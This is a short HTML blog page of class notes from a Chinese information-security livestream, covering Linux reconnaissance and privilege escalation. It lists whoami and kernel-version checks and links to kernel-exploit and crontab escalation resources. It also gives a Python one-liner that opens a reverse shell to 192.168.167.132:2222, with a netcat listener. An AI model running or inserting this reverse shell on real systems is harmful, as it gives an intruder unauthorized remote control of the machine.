@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>西普信息安全直播课记录 - LionTree</title>
+  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=工具,内网渗透,提权>
+  
+  
+  
+    <link rel="alternate" href="/atom.xml " title="LionTree" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">LionTree</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/summary" class="menu-item-link">Summary</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/atom.xml" class="menu-item-link">RSS</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">西普信息安全直播课记录</h1>
+  </div>
+
+  <!-- 文章目录 -->
+  <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#打扫战场——后门清除与总结"><span class="toc-text">打扫战场——后门清除与总结</span></a></li></ol>
+
+  <div class="post-content">
+    <p><a href="http://www.nisphome.cn/article-detail?id=164" target="_blank" rel="noopener">http://www.nisphome.cn/article-detail?id=164</a></p>
+<h3 id="打扫战场——后门清除与总结"><a href="#打扫战场——后门清除与总结" class="headerlink" title="打扫战场——后门清除与总结"></a>打扫战场——后门清除与总结</h3><ul>
+<li>whoami查看用户名</li>
+<li>cat /proc/version 查看linux版本</li>
+<li>linux内核漏洞提权<br><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a></li>
+<li>crontab提权    <a href="https://www.freebuf.com/articles/system/175453.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/175453.html</a><br>/etc/crontab  定时任务</li>
+<li>简单的反向shell脚本<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> linux上简单的反弹shell</span></span><br><span class="line">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.167.132",2222));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><br></pre></td></tr></table></figure>
+用netcat -lvp 2222监听</li>
+</ul>
+
+  </div>
+  <div class="post-meta">
+    <span class="post-time" style="color:#646060;font-size:13px">2019-03-26</span>
+  </div>
+
+  <div class="post-footer">
+    
+      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/%E6%8F%90%E6%9D%83/" rel="tag">提权</a></li></ul>
+    
+
+    <a href="#top" class="top">Back to Top</a>
+  </div>
+</article>
+
+<!-- 评论插件 -->
+
+<footer>
+  2025
+  <span class="author">
+    LionTree
+  </span>
+</footer>
+
+
+    </div>
+  </body>
+</html>
